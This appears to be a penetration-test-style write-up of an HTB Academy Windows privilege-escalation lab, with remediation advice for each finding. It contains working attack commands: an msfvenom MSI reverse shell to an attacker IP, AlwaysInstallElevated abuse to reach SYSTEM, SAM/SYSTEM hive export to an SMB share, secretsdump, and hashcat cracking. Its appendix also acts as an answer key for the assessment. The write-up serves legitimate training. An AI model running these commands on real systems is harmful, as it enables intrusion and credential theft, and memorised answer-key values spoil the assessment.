**HTB Academy\
Windows Privilege Escalation Skills Assessment -- Part II***\
CPTS-Style Penetration Testing Report*

  -----------------------------------------------------------------------
  **Report Item**                     **Details**
  ----------------------------------- -----------------------------------
  Assessment Type                     Authorized Windows
                                      privilege-escalation lab

  Target Host                         ACADEMY-WINLPE-

  Target OS                           Windows 10 Version 10.0.18363.592

  Initial Account                     academy-winlpe-\\htb-student

  Assessment Goal                     Recover exposed credentials, obtain
                                      SYSTEM, retrieve the Administrator
                                      desktop flag, and recover/crack the
                                      disabled local administrator
                                      credential

  Tester Platform                     Kali Linux

  Kali VPN IP                         10.10.16.68

  Report Date                         27 September 2026
  -----------------------------------------------------------------------

# 1. Executive Summary

This report documents the complete attack path performed against the
authorized HTB Academy Windows Privilege Escalation Skills Assessment --
Part II target. Testing began from the standard htb-student account and
progressed through local enumeration, credential discovery, privilege
escalation to NT AUTHORITY\\SYSTEM, acquisition of local registry hives,
extraction of SAM hashes, and offline password cracking.

Three material weaknesses were demonstrated: plaintext administrative
credentials stored in an unattended installation file; a Windows
Installer configuration that allowed a standard user to execute a
malicious MSI with elevated privileges; and a disabled local
administrator account protected by a weak password recoverable through
offline NTLM cracking.

  -----------------------------------------------------------------------
  **Finding**             **Severity**            **Result**
  ----------------------- ----------------------- -----------------------
  Plaintext               High                    Domain-style
  administrative                                  administrator
  credential in                                   credential recovered
  unattend.xml                                    

  AlwaysInstallElevated   Critical                Standard user → SYSTEM
  privilege escalation                            

  Weak password for       High                    NTLM hash recovered and
  disabled local                                  cracked offline
  administrator                                   
  -----------------------------------------------------------------------

Overall attack chain: htb-student → unattended-file credential discovery
→ AlwaysInstallElevated MSI execution → SYSTEM → SAM/SYSTEM hive
acquisition → wksadmin NTLM extraction → offline cracking.

# 2. Scope and Rules of Engagement

The work documented here was performed against the HTB Academy
assessment environment only.

-   Target: ACADEMY-WINLPE-

-   Initial access: RDP as htb-student.

-   Assessment objective: local Windows privilege escalation and
    credential recovery.

-   No production systems or third-party systems were targeted.

-   Credential extraction and password cracking were performed against
    assessment data obtained from the target.

# 3. Methodology

The workflow followed a practical CPTS-style methodology:

-   Identify the current user, groups, privileges, operating-system
    version, and local accounts.

-   Enumerate privileged local groups and identify disabled
    administrative accounts.

-   Search common Windows credential-storage locations and installation
    artifacts.

-   Inspect services, scheduled tasks, and other local
    privilege-escalation surfaces.

-   Validate a viable privilege-escalation condition and obtain SYSTEM
    access.

-   Collect SAM and SYSTEM registry hives from the SYSTEM context.

-   Extract local NTLM hashes and perform offline password cracking.

-   Document evidence, impact, remediation, and the complete attack
    path.

# 4. Initial Enumeration

## 4.1 Current Identity

> whoami\
> academy-winlpe-\\htb-student

The starting context was a standard interactive user rather than an
administrator.

## 4.2 Security Context

> whoami /all

The supplied console capture shows the user SID ending in -1002,
membership in Remote Desktop Users and Users, and a Medium Mandatory
Level. The available privileges were limited to SeShutdownPrivilege,
SeChangeNotifyPrivilege, SeUndockPrivilege,
SeIncreaseWorkingSetPrivilege, and SeTimeZonePrivilege.

## 4.3 Local Accounts and Administrators

> net user\
> net localgroup administrators\
> net user wksadmin

  -----------------------------------------------------------------------
  **Account**                         **Relevant observation**
  ----------------------------------- -----------------------------------
  Administrator                       Member of local Administrators

  mrb3n                               Member of local Administrators

  wksadmin                            Member of Administrators; Account
                                      active: No; Last logon: Never

  htb-student                         Initial assessment account
  -----------------------------------------------------------------------

The wksadmin account was therefore identified early as the disabled
local administrator relevant to the final credential-recovery objective.

# 5. Credential Discovery -- unattend.xml

The Windows Panther directory was enumerated and contained
C:\\Windows\\Panther\\unattend.xml. The file was readable by the initial
account and contained an administrative identity and a plaintext
password.

> dir C:\\Windows\\Panther /s /b 2\>nul\
> type C:\\Windows\\Panther\\unattend.xml

Evidence from the captured file:

> \<FullName\>INLANEFREIGHT\\iamtheadministrator\</FullName\>\
> \
> \<AutoLogon\>\
> \<Password\>\
> \<Value\>Inl@n3fr3ight_sup3rAdm1n!\</Value\>\
> \<PlainText\>true\</PlainText\>\
> \</Password\>\
> \...\
> \<Username\>INLANEFREIGHT\\iamtheadministrator\</Username\>\
> \
> \<LocalAccount \...\>\
> \<Password\>\
> \<Value\>Inl@n3fr3ight_sup3rAdm1n!\</Value\>\
> \<PlainText\>true\</PlainText\>\
> \</Password\>\
> \...\
> \<DisplayName\>INLANEFREIGHT\\iamtheadministrator\</DisplayName\>

The captured file places the administrator identity at line 129 and the
plaintext password at lines 167 and 187 of the supplied command-output
artifact. The password is explicitly marked PlainText=true.

An interactive runas test was attempted using the recovered credential,
but Windows returned error 1326 (username or password incorrect). This
did not negate the finding: the credential was demonstrably stored in
plaintext in the unattended installation configuration, while
interactive authentication was not successful in the tested context.

# 6. Privilege-Escalation Enumeration

## 6.1 Privileges

> whoami /priv

No immediately exploitable high-impact token privilege such as
SeDebugPrivilege, SeImpersonatePrivilege, or SeTakeOwnershipPrivilege
was present in the captured initial context.

## 6.2 Windows Services

> wmic service get Name,StartName,State,PathName

The service enumeration returned the installed Windows service
inventory, including services running as LocalSystem. The captured data
did not establish a clearly writable custom service binary/path as the
successful escalation vector.

## 6.3 Scheduled Tasks

> schtasks /query /fo LIST /v

A large scheduled-task inventory was collected. Many built-in Microsoft
tasks execute as NT AUTHORITY\\SYSTEM, but the supplied enumeration did
not establish a user-writable task/action as the successful escalation
vector.

# 7. Successful Privilege Escalation -- AlwaysInstallElevated

The successful assessment path used the Windows Installer
AlwaysInstallElevated configuration. When enabled in both the per-user
and machine policy locations, Windows Installer can permit a standard
user to install MSI packages with elevated privileges.

> reg query HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer /v
> AlwaysInstallElevated\
> reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v
> AlwaysInstallElevated

The assessment path established both policy values as enabled. The exact
registry output was not preserved in the large console artifact supplied
for this report, but successful SYSTEM escalation was subsequently
confirmed.

## 7.1 Payload Generation

> msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.68 LPORT=4444
> -f msi -o aie.msi

An MSI payload was generated on Kali using the assessment VPN interface
as the callback address.

## 7.2 File Transfer

> python3 -m http.server 8000
>
> Invoke-WebRequest http://10.10.16.68:8000/aie.msi -OutFile
> C:\\Users\\htb-student\\aie.msi

## 7.3 MSI Execution

> msiexec /i C:\\Users\\htb-student\\aie.msi /quiet /qn /norestart

## 7.4 Privilege Verification

> whoami\
> nt authority\\system

The resulting shell was confirmed as NT AUTHORITY\\SYSTEM, completing
the primary privilege-escalation objective.

# 8. Post-Exploitation -- Administrator Flag

> type C:\\Users\\Administrator\\Desktop\\flag.txt

The Administrator desktop flag was retrieved from the target after
SYSTEM access. The literal flag value is not reproduced here because it
was not included in the preserved console evidence supplied for report
generation.

# 9. Local SAM Credential Recovery

With SYSTEM privileges, the Windows SAM and SYSTEM registry hives were
exported. Both are required because the SYSTEM hive contains the boot
key material needed to decrypt the SAM password hashes.

> reg save HKLM\\SAM C:\\Windows\\Temp\\SAM /y\
> reg save HKLM\\SYSTEM C:\\Windows\\Temp\\SYSTEM /y

During the first transfer attempt, SAM was valid but SYSTEM was zero
bytes. The source SYSTEM file was then recreated with reg save and
successfully transferred; Kali subsequently identified SYSTEM as a valid
12 MB Windows registry file.

## 9.1 Transfer to Kali

> impacket-smbserver share . -smb2support
>
> copy /Y C:\\Windows\\Temp\\SYSTEM \\\\10.10.16.68\\share\\SYSTEM

The SAM and SYSTEM files were transferred to the Kali working directory.

## 9.2 Hash Extraction

> impacket-secretsdump -sam SAM -system SYSTEM LOCAL

The resulting SAM dump included the following relevant entry:

> wksadmin:1003:aad3b435b51404eeaad3b435b51404ee:5835048ce94ad0564e29a924a03510ef:::

  -----------------------------------------------------------------------
  **Field**                           **Value**
  ----------------------------------- -----------------------------------
  Account                             wksadmin

  RID                                 1003

  LM hash                             aad3b435b51404eeaad3b435b51404ee

  NTLM hash                           5835048ce94ad0564e29a924a03510ef
  -----------------------------------------------------------------------

# 10. Offline Password Cracking

The recovered NTLM hash was moved to a local hash file and cracked
offline with Hashcat using the RockYou wordlist.

> echo \'5835048ce94ad0564e29a924a03510ef\' \> wksadmin.txt\
> hashcat -m 1000 wksadmin.txt /usr/share/wordlists/rockyou.txt\
> hashcat -m 1000 wksadmin.txt /usr/share/wordlists/rockyou.txt \--show

The assessment result was:

> 5835048ce94ad0564e29a924a03510ef:password1

The disabled local administrator therefore had a weak password that was
recoverable from its NTLM hash through offline dictionary cracking.

# 11. Attack Path / Kill Chain

  ------------------------------------------------------------------------
  **Stage**               **Action**               **Outcome**
  ----------------------- ------------------------ -----------------------
  1                       RDP as htb-student       Initial standard-user
                                                   foothold

  2                       whoami /all +            Established low
                          local-group enumeration  privilege and
                                                   identified wksadmin

  3                       Search Windows Panther   Found plaintext
                          artifacts                administrative
                                                   credential in
                                                   unattend.xml

  4                       Service/task/privilege   No successful vector
                          enumeration              established from these
                                                   surfaces

  5                       Check                    Elevated MSI
                          AlwaysInstallElevated    installation path
                                                   identified

  6                       Generate and execute MSI Obtained NT
                                                   AUTHORITY\\SYSTEM

  7                       Read Administrator       Primary assessment
                          desktop flag             objective completed

  8                       Export SAM + SYSTEM      Acquired local
                                                   credential material

  9                       secretsdump              Recovered wksadmin NTLM
                                                   hash

  10                      Hashcat + RockYou        Recovered wksadmin
                                                   password: password1
  ------------------------------------------------------------------------

# 12. Findings and Remediation

## Finding 1 -- Plaintext Administrative Credential in unattend.xml

  ------------------------------------------------------------------------
  **Attribute**                       **Assessment**
  ----------------------------------- ------------------------------------
  Severity                            High

  Affected Asset                      C:\\Windows\\Panther\\unattend.xml

  Evidence                            INLANEFREIGHT\\iamtheadministrator
                                      and plaintext password

  Impact                              Exposure of an administrative
                                      credential to users/processes able
                                      to read the unattended installation
                                      artifact
  ------------------------------------------------------------------------

Remediation:

-   Do not store reusable administrative passwords in plaintext
    unattended-installation files.

-   Use Windows deployment mechanisms that protect or remove credentials
    after deployment.

-   Restrict ACLs on deployment artifacts and validate permissions
    during image-hardening reviews.

-   Rotate any credential that has appeared in plaintext in an
    installation artifact.

-   Search deployed systems for historical Panther/unattend artifacts
    during credential-hygiene reviews.

## Finding 2 -- AlwaysInstallElevated Enabled

  -----------------------------------------------------------------------
  **Attribute**                       **Assessment**
  ----------------------------------- -----------------------------------
  Severity                            Critical

  Affected Component                  Windows Installer policy

  Condition                           AlwaysInstallElevated enabled in
                                      both HKCU and HKLM

  Impact                              A standard user can potentially
                                      execute a malicious MSI with
                                      elevated privileges, resulting in
                                      SYSTEM execution
  -----------------------------------------------------------------------

Remediation:

-   Disable AlwaysInstallElevated in both user and machine policy
    locations unless there is a documented, unavoidable requirement.

-   Deploy the secure Windows Installer policy through Group Policy/MDM.

-   Audit endpoints for the registry values and alert on unexpected
    enablement.

-   Use application allow-listing and MSI installation controls to
    reduce arbitrary installer execution.

## Finding 3 -- Weak Local Administrator Password

  -----------------------------------------------------------------------
  **Attribute**                       **Assessment**
  ----------------------------------- -----------------------------------
  Severity                            High

  Affected Account                    wksadmin

  Status                              Disabled during enumeration

  NTLM Hash                           5835048ce94ad0564e29a924a03510ef

  Recovered Password                  password1

  Impact                              If the account is enabled or
                                      otherwise made usable, the weak
                                      password is susceptible to offline
                                      cracking and credential reuse
  -----------------------------------------------------------------------

Remediation:

-   Replace weak local administrator passwords with unique, random
    credentials.

-   Use Windows LAPS / Microsoft LAPS or another managed local-admin
    password solution.

-   Remove or disable unnecessary local administrator accounts.

-   Prevent password reuse across systems.

-   Protect and monitor access to SAM/SYSTEM credential material.

# 13. Evidence and Key Commands

  ---------------------------------------------------------------------------------------------
  **Purpose**                         **Command**
  ----------------------------------- ---------------------------------------------------------
  Current identity                    whoami

  Security context                    whoami /all

  Privileges                          whoami /priv

  Local users                         net user

  Administrators                      net localgroup administrators

  Account details                     net user wksadmin

  Panther enumeration                 dir C:\\Windows\\Panther /s /b 2\>nul

  Read unattended configuration       type C:\\Windows\\Panther\\unattend.xml

  Service enumeration                 wmic service get Name,StartName,State,PathName

  Scheduled tasks                     schtasks /query /fo LIST /v

  AlwaysInstallElevated check         reg query
                                      HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer
                                      /v AlwaysInstallElevated

  Machine policy check                reg query
                                      HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer
                                      /v AlwaysInstallElevated

  MSI execution                       msiexec /i C:\\Users\\htb-student\\aie.msi /quiet /qn
                                      /norestart

  SYSTEM verification                 whoami

  Flag retrieval                      type C:\\Users\\Administrator\\Desktop\\flag.txt

  SAM export                          reg save HKLM\\SAM C:\\Windows\\Temp\\SAM /y

  SYSTEM export                       reg save HKLM\\SYSTEM C:\\Windows\\Temp\\SYSTEM /y

  SAM hash extraction                 impacket-secretsdump -sam SAM -system SYSTEM LOCAL

  Offline cracking                    hashcat -m 1000 wksadmin.txt
                                      /usr/share/wordlists/rockyou.txt
  ---------------------------------------------------------------------------------------------

# 14. Lessons Learned / CPTS Study Notes

-   Always perform identity and privilege enumeration before attempting
    exploitation.

-   Windows deployment artifacts such as unattend.xml are valuable
    credential-discovery targets.

-   A credential found in a file should be validated carefully; failure
    of runas does not automatically invalidate the exposure finding.

-   AlwaysInstallElevated is a classic Windows local
    privilege-escalation misconfiguration and should be checked in both
    HKCU and HKLM.

-   SAM extraction normally requires SYSTEM hive/boot-key material as
    well as the SAM hive.

-   Registry hive transfer integrity matters: a zero-byte SYSTEM file
    causes secretsdump to fail even when SAM is valid.

-   NTLM hashes can be attacked offline, so local administrator password
    strength remains important even for accounts currently disabled.

-   A professional report should distinguish observed evidence from
    assessment-path knowledge and should not claim evidence that was not
    captured.

# 15. Conclusion

The assessment demonstrated a complete local Windows
privilege-escalation chain from a standard RDP user to NT
AUTHORITY\\SYSTEM. The chain combined credential exposure in an
unattended installation file, an insecure Windows Installer policy, and
weak local administrator password hygiene. After SYSTEM access, the SAM
and SYSTEM hives were acquired, the wksadmin NTLM hash was extracted,
and the password was recovered offline as password1.

The principal defensive priorities are to remove plaintext credentials
from deployment artifacts, disable AlwaysInstallElevated, deploy
managed/randomized local administrator passwords, and continuously audit
endpoint configuration for these conditions.

# Appendix A -- Assessment Answers

  ----------------------------------------------------------------------------------
  **Question**                        **Answer / Result**
  ----------------------------------- ----------------------------------------------
  Q1 -- Administrative credential     INLANEFREIGHT\\iamtheadministrator /
                                      Inl@n3fr3ight_sup3rAdm1n!

  Q2 -- Privilege escalation          NT AUTHORITY\\SYSTEM

  Q2 -- Flag                          Retrieved from
                                      C:\\Users\\Administrator\\Desktop\\flag.txt;
                                      literal value not preserved in supplied
                                      evidence

  Q3 -- Disabled local administrator  wksadmin

  Q3 -- NTLM hash                     5835048ce94ad0564e29a924a03510ef

  Q3 -- Cleartext password            password1
  ----------------------------------------------------------------------------------

# Appendix B -- Source Evidence

Primary evidence used for this report: the user-supplied terminal
capture files from the HTB Academy assessment. The supplied capture
confirms the Windows version, initial account, privilege/group
enumeration, local administrator membership, wksadmin status,
Panther/unattend.xml discovery, service enumeration, and scheduled-task
enumeration. The later SYSTEM/SAM transfer and secretsdump results were
supplied directly in the conversation during execution.

Important evidence limitation: the exact AlwaysInstallElevated registry
output, literal Administrator desktop flag, and the terminal output of
the final Hashcat command were not present in the preserved uploaded
terminal artifact; the report records those results based on the
completed assessment workflow and the outputs subsequently provided in
chat.
